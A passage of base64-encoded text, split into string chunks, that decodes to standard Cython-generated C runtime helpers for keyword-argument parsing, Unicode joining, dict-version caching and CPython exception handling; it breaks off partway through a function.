iAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlcygpIGdvdCBhbiB1bmV4cGVjdGVkIGtleXdvcmQgYXJndW1lbnQgJyVVJyIsCiAgICAgICAgZnVuY3Rpb25fbmFtZSwga2V5KTsKICAgIGdvdG8gYmFkOwpiYWQ6CiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X1hERUNSRUYoa2V5KTsKICAgICNlbmRpZgogICAgcmV0dXJuIC0xOwp9CnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkcygKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiBjb25zdCAqa3d2YWx1ZXMsCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAog""ICAgUHlPYmplY3QgKmt3ZHMyLAogICAgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsCiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLAogICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncykKewogICAgaWYgKENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIGxpa2VseShQeVR1cGxlX0NoZWNrKGt3ZHMpKSkKICAgICAgICByZXR1cm4gX19QeXhfUGFyc2VLZXl3b3Jkc1R1cGxlKGt3ZHMsIGt3dmFsdWVzLCBhcmduYW1lcywga3dkczIsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBudW1fa3dhcmdzLCBmdW5jdGlvbl9uYW1lLCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpOwogICAgZWxzZSBpZiAoa3dkczIpCiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZERpY3RUb0RpY3Qoa3dkcywgYXJnbmFtZXMsIGt3ZHMyLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgZnVuY3Rpb25fbmFtZSk7CiAgICBlbHNlCiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZERpY3Qoa3dkcywgYXJnbmFtZXMsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBudW1fa3dhcmdzLCBmdW5jdGlvbl9uYW1lLCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpOwp9CgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoCiAgICBjb25zdCBjaGFyKiBmdW5jX25hbWUsCiAgICBpbnQgZXhhY3QsCiAgICBQeV9zc2l6ZV90IG51bV9taW4sCiAgICBQeV9zc2l6ZV90IG51bV9tYXgsCiAgICBQeV9zc2l6ZV90IG51bV9mb3VuZCkKewogICAgUHlfc3NpemVfdCBudW1fZXhwZWN0ZWQ7CiAgICBjb25zdCBjaGFyICptb3JlX29yX2xlc3M7CiAgICBpZiAobnVtX2ZvdW5kIDwgbnVtX21pbikgewogICAgICAgIG51bV9leHBlY3RlZCA9IG51bV9taW47CiAgICAgICAgbW9yZV9vcl9sZXNzID0gImF0IGxlYXN0IjsKICAgIH0gZWxzZSB7CiAgICAgICAgbnVtX2V4cGVjdGVkID0gbnVtX21heDsKICAgICAgICBtb3JlX29yX2xlc3MgPSAiYXQgbW9zdCI7CiAgICB9CiAgICBpZiAoZXhhY3QpIHsKICAgICAgICBtb3JlX29yX2xlc3MgPSAiZXhhY3RseSI7CiAgICB9CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICIlLjIwMHMoKSB0YWtlcyAlLjhzICUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCBwb3NpdGlvbmFsIGFyZ3VtZW50JS4xcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsCiAgICAgICAgICAgICAgICAgZnVuY19uYW1lLCBtb3JlX29yX2xlc3MsIG51bV9leHBlY3RlZCwKICAgICAgICAgICAgICAgICAobnVtX2V4cGVjdGVkID09IDEpID8gIiIgOiAicyIsIG51bV9mb3VuZCk7Cn0KCgojaWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpv""YmopIHsKICAgIFB5T2JqZWN0ICpkaWN0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0OwogICAgcmV0dXJuIGxpa2VseShkaWN0KSA/IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgOiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHsKICAgIFB5T2JqZWN0ICoqZGljdHB0ciA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdG9mZnNldDsKICAgIGlmIChvZmZzZXQpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGRpY3RwdHIgPSAobGlrZWx5KG9mZnNldCA+IDApKSA/IChQeU9iamVjdCAqKikgKChjaGFyICopb2JqICsgb2Zmc2V0KSA6IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiNlbHNlCiAgICAgICAgZGljdHB0ciA9IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiNlbmRpZgogICAgfQogICAgcmV0dXJuIChkaWN0cHRyICYmICpkaWN0cHRyKSA/IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oKmRpY3RwdHIpIDogMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfb2JqZWN0X2RpY3RfdmVyc2lvbl9tYXRjaGVzKFB5T2JqZWN0KiBvYmosIFBZX1VJTlQ2NF9UIHRwX2RpY3RfdmVyc2lvbiwgUFlfVUlOVDY0X1Qgb2JqX2RpY3RfdmVyc2lvbikgewogICAgUHlPYmplY3QgKmRpY3QgPSBQeV9UWVBFKG9iaiktPnRwX2RpY3Q7CiAgICBpZiAodW5saWtlbHkoIWRpY3QpIHx8IHVubGlrZWx5KHRwX2RpY3RfdmVyc2lvbiAhPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpKSkKICAgICAgICByZXR1cm4gMDsKICAgIHJldHVybiBvYmpfZGljdF92ZXJzaW9uID09IF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKG9iaik7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lLCBQWV9VSU5UNjRfVCAqZGljdF92ZXJzaW9uLCBQeU9iamVjdCAqKmRpY3RfY2FjaGVkX3ZhbHVlKQojZWxzZQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpCiNlbmRpZgp7CiAgICBQeU9iamVjdCAqcmVzdWx0OwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tKSkgewogICAgICAgIGlmICghUHlFcnJfT2NjdXJyZWQoKSkKICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19OYW1lRXJyb3IpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmVzdWx0ID0gUHlPYmplY3RfR2V0QXR0cihfX3B5eF9tLCBuYW1lKTsKICAgIGlmIChsaWtlbHkocmVzdWx0KSkgewogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwojZWxpZiBDWVRIT05fQVZPSURfQk9S""Uk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgbmFtZSwgJnJlc3VsdCkgPT0gLTEpKSBQeUVycl9DbGVhcigpOwogICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQojZWxzZQogICAgcmVzdWx0ID0gX1B5RGljdF9HZXRJdGVtX0tub3duSGFzaChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBuYW1lLCAoKFB5QVNDSUlPYmplY3QgKikgbmFtZSktPmhhc2gpOwogICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHsKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKHJlc3VsdCk7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwojZW5kaWYKICAgIHJldHVybiBfX1B5eF9HZXRCdWlsdGluTmFtZShuYW1lKTsKfQoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0pvaW4oUHlPYmplY3QqKiB2YWx1ZXMsIFB5X3NzaXplX3QgdmFsdWVfY291bnQsIFB5X3NzaXplX3QgcmVzdWx0X3VsZW5ndGgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfVUNTNCBtYXhfY2hhcikgewojaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlPYmplY3QgKnJlc3VsdF91dmFsOwogICAgaW50IHJlc3VsdF91a2luZCwga2luZF9zaGlmdDsKICAgIFB5X3NzaXplX3QgaSwgY2hhcl9wb3M7CiAgICB2b2lkICpyZXN1bHRfdWRhdGE7CiAgICBpZiAobWF4X2NoYXIgPiAxMTE0MTExKSBtYXhfY2hhciA9IDExMTQxMTE7CiAgICByZXN1bHRfdXZhbCA9IFB5VW5pY29kZV9OZXcocmVzdWx0X3VsZW5ndGgsIG1heF9jaGFyKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0X3V2YWwpKSByZXR1cm4gTlVMTDsKICAgIHJlc3VsdF91a2luZCA9IChtYXhfY2hhciA8PSAyNTUpID8gUHlVbmljb2RlXzFCWVRFX0tJTkQgOiAobWF4X2NoYXIgPD0gNjU1MzUpID8gUHlVbmljb2RlXzJCWVRFX0tJTkQgOiBQeVVuaWNvZGVfNEJZVEVfS0lORDsKICAgIGtpbmRfc2hpZnQgPSAocmVzdWx0X3VraW5kID09IFB5VW5pY29kZV80QllURV9LSU5EKSA/IDIgOiByZXN1bHRfdWtpbmQgLSAxOwogICAgcmVzdWx0X3VkYXRhID0gUHlVbmljb2RlX0RBVEEocmVzdWx0X3V2YWwpOwogICAgYXNzZXJ0KGtpbmRfc2hpZnQgPT0gMiB8fCBraW5kX3NoaWZ0ID09IDEg""fHwga2luZF9zaGlmdCA9PSAwKTsKICAgIGlmICh1bmxpa2VseSgoUFlfU1NJWkVfVF9NQVggPj4ga2luZF9zaGlmdCkgLSByZXN1bHRfdWxlbmd0aCA8IDApKQogICAgICAgIGdvdG8gb3ZlcmZsb3c7CiAgICBjaGFyX3BvcyA9IDA7CiAgICBmb3IgKGk9MDsgaSA8IHZhbHVlX2NvdW50OyBpKyspIHsKICAgICAgICBpbnQgdWtpbmQ7CiAgICAgICAgUHlfc3NpemVfdCB1bGVuZ3RoOwogICAgICAgIHZvaWQgKnVkYXRhOwogICAgICAgIFB5T2JqZWN0ICp1dmFsID0gdmFsdWVzW2ldOwogICAgICAgICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIGlmIChfX1B5eF9QeVVuaWNvZGVfUkVBRFkodXZhbCkgPT0gKC0xKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgI2VuZGlmCiAgICAgICAgdWxlbmd0aCA9IF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKHV2YWwpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBpZiAodW5saWtlbHkodWxlbmd0aCA8IDApKSBnb3RvIGJhZDsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAodW5saWtlbHkoIXVsZW5ndGgpKQogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICBpZiAodW5saWtlbHkoKFBZX1NTSVpFX1RfTUFYID4+IGtpbmRfc2hpZnQpIC0gdWxlbmd0aCA8IGNoYXJfcG9zKSkKICAgICAgICAgICAgZ290byBvdmVyZmxvdzsKICAgICAgICB1a2luZCA9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHV2YWwpOwogICAgICAgIHVkYXRhID0gX19QeXhfUHlVbmljb2RlX0RBVEEodXZhbCk7CiAgICAgICAgaWYgKHVraW5kID09IHJlc3VsdF91a2luZCkgewogICAgICAgICAgICBtZW1jcHkoKGNoYXIgKilyZXN1bHRfdWRhdGEgKyAoY2hhcl9wb3MgPDwga2luZF9zaGlmdCksIHVkYXRhLCAoc2l6ZV90KSAodWxlbmd0aCA8PCBraW5kX3NoaWZ0KSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5VW5pY29kZV9Db3B5Q2hhcmFjdGVycyhyZXN1bHRfdXZhbCwgY2hhcl9wb3MsIHV2YWwsIDAsIHVsZW5ndGgpIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICAgICAjZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgZGVmaW5lZChfUHlVbmljb2RlX0Zhc3RDb3B5Q2hhcmFjdGVycykKICAgICAgICAgICAgX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMocmVzdWx0X3V2YWwsIGNoYXJfcG9zLCB1dmFsLCAwLCB1bGVuZ3RoKTsKICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgUHlfc3NpemVfdCBqOwogICAgICAgICAgICBmb3IgKGo9MDsgaiA8IHVsZW5ndGg7IGorKykgewogICAgICAgICAgICAgICAgUHlfVUNTNCB1Y2hhciA9IF9fUHl4X1B5VW5pY29kZV9SRUFEKHVraW5kLCB1ZGF0YSwgaik7CiAgICAgICAgICAgICAgICBfX1B5eF9QeVVuaWNvZGVfV1JJVEUocmVzdWx0X3VraW5kLCByZXN1""bHRfdWRhdGEsIGNoYXJfcG9zK2osIHVjaGFyKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAjZW5kaWYKICAgICAgICB9CiAgICAgICAgY2hhcl9wb3MgKz0gdWxlbmd0aDsKICAgIH0KICAgIHJldHVybiByZXN1bHRfdXZhbDsKb3ZlcmZsb3c6CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwgImpvaW4oKSByZXN1bHQgaXMgdG9vIGxvbmcgZm9yIGEgUHl0aG9uIHN0cmluZyIpOwpiYWQ6CiAgICBQeV9ERUNSRUYocmVzdWx0X3V2YWwpOwogICAgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeV9zc2l6ZV90IGk7CiAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDsKICAgIFB5T2JqZWN0ICp2YWx1ZV90dXBsZSA9IFB5VHVwbGVfTmV3KHZhbHVlX2NvdW50KTsKICAgIGlmICh1bmxpa2VseSghdmFsdWVfdHVwbGUpKSByZXR1cm4gTlVMTDsKICAgIENZVEhPTl9VTlVTRURfVkFSKG1heF9jaGFyKTsKICAgIENZVEhPTl9VTlVTRURfVkFSKHJlc3VsdF91bGVuZ3RoKTsKICAgIGZvciAoaT0wOyBpPHZhbHVlX2NvdW50OyBpKyspIHsKICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTSh2YWx1ZV90dXBsZSwgaSwgdmFsdWVzW2ldKSAhPSAoMCkpIGdvdG8gYmFkOwogICAgICAgIFB5X0lOQ1JFRih2YWx1ZXNbaV0pOwogICAgfQogICAgcmVzdWx0ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSwgdmFsdWVfdHVwbGUpOwpiYWQ6CiAgICBQeV9ERUNSRUYodmFsdWVfdHVwbGUpOwogICAgcmV0dXJuIHJlc3VsdDsKI2VuZGlmCn0KCgojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwKc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbikgewogICAgKHZvaWQpX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0OwogICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oYnVpbGRlciwgbiwga2V5KSAhPSAoMCkpIHJldHVybiAtMTsKICAgIFB5X0lOQ1JFRihrZXkpOwogICAgYXJnc1tuXSA9IHZhbHVlOwogICAgcmV0dXJuIDA7Cn0KQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ19DaGVjayhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBQeU9iamVjdCAqKmFyZ3MsIGludCBuKSB7CiAgICAodm9pZClfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHI7CiAgICBpZiAodW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhrZXkpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICJrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3Ms""IG4pOwp9CnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGNvbnN0IGNoYXIgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbikgewogICAgUHlPYmplY3QgKnB5S2V5ID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoa2V5KTsKICAgIGlmICghcHlLZXkpIHJldHVybiAtMTsKICAgIHJldHVybiBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcocHlLZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKTsKfQojZWxzZSAvLyBDWVRIT05fVkVDVE9SQ0FMTApDWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKiphcmdzLCBDWVRIT05fVU5VU0VEIGludCBuKSB7CiAgICBpZiAodW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhrZXkpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICJrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gUHlEaWN0X1NldEl0ZW0oYnVpbGRlciwga2V5LCB2YWx1ZSk7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCnN0YXRpYyBfUHlFcnJfU3RhY2tJdGVtICoKX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbihQeVRocmVhZFN0YXRlICp0c3RhdGUpCnsKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbzsKICAgIHdoaWxlICgoZXhjX2luZm8tPmV4Y192YWx1ZSA9PSBOVUxMIHx8IGV4Y19pbmZvLT5leGNfdmFsdWUgPT0gUHlfTm9uZSkgJiYKICAgICAgICAgICBleGNfaW5mby0+cHJldmlvdXNfaXRlbSAhPSBOVUxMKQogICAgewogICAgICAgIGV4Y19pbmZvID0gZXhjX2luZm8tPnByZXZpb3VzX2l0ZW07CiAgICB9CiAgICByZXR1cm4gZXhjX2luZm87Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25TYXZlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7CiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKHRzdGF0ZSk7CiAgICBQeU9iamVjdCAqZXhjX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgIGlmIChleGNfdmFsdWUgPT0gTlVMTCB8fCBleGNfdmFsdWUgPT0gUHlfTm9uZSkgewogICAgICAgICp2YWx1ZSA9IE5VTEw7CiAgICAgICAgKnR5""cGUgPSBOVUxMOwogICAgICAgICp0YiA9IE5VTEw7CiAgICB9IGVsc2UgewogICAgICAgICp2YWx1ZSA9IGV4Y192YWx1ZTsKICAgICAgICBQeV9JTkNSRUYoKnZhbHVlKTsKICAgICAgICAqdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUoZXhjX3ZhbHVlKTsKICAgICAgICBQeV9JTkNSRUYoKnR5cGUpOwogICAgICAgICp0YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfdmFsdWUpOwogICAgfQogICNlbGlmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpOwogICAgKnR5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7CiAgICAqdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgKnRiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICBQeV9YSU5DUkVGKCp0eXBlKTsKICAgIFB5X1hJTkNSRUYoKnZhbHVlKTsKICAgIFB5X1hJTkNSRUYoKnRiKTsKICAjZWxzZQogICAgKnR5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgKnZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICAqdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICBQeV9YSU5DUkVGKCp0eXBlKTsKICAgIFB5X1hJTkNSRUYoKnZhbHVlKTsKICAgIFB5X1hJTkNSRUYoKnRiKTsKICAjZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25SZXNldChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICp0eXBlLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICp0YikgewogICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbzsKICAgIFB5T2JqZWN0ICp0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IHZhbHVlOwogICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpOwogICAgUHlfWERFQ1JFRih0eXBlKTsKICAgIFB5X1hERUNSRUYodGIpOwogICNlbHNlCiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSB0eXBlOwogICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IHZhbHVlOwogICAgZXhjX2luZm8tPmV4Y190cmFjZWJhY2sgPSB0YjsKICAgICNlbHNlCiAgICB0bXBfdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTsKICAg""IHRtcF90YiA9IHRzdGF0ZS0+ZXhjX3RyYWNlYmFjazsKICAgIHRzdGF0ZS0+ZXhjX3R5cGUgPSB0eXBlOwogICAgdHN0YXRlLT5leGNfdmFsdWUgPSB2YWx1ZTsKICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9IHRiOwogICAgI2VuZGlmCiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodG1wX3RiKTsKICAjZW5kaWYKfQojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKGNvbnN0IGNoYXIgKnZhcm5hbWUpIHsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19VbmJvdW5kTG9jYWxFcnJvciwgImxvY2FsIHZhcmlhYmxlICclcycgcmVmZXJlbmNlZCBiZWZvcmUgYXNzaWdubWVudCIsIHZhcm5hbWUpOwp9CgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgaW50IF9fUHl4X19HZXRFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpCiNlbHNlCnN0YXRpYyBpbnQgX19QeXhfR2V0RXhjZXB0aW9uKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikKI2VuZGlmCnsKICAgIFB5T2JqZWN0ICpsb2NhbF90eXBlID0gTlVMTCwgKmxvY2FsX3ZhbHVlLCAqbG9jYWxfdGIgPSBOVUxMOwojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAgIGxvY2FsX3ZhbHVlID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjsKICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSAwOwogICNlbHNlCiAgICBsb2NhbF90eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTsKICAgIGxvY2FsX3ZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7CiAgICBsb2NhbF90YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjazsKICAgIHRzdGF0ZS0+Y3VyZXhjX3R5cGUgPSAwOwogICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSAwOwogICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gMDsKICAjZW5kaWYKI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDAKICAgIGxvY2FsX3ZhbHVlID0gUHlFc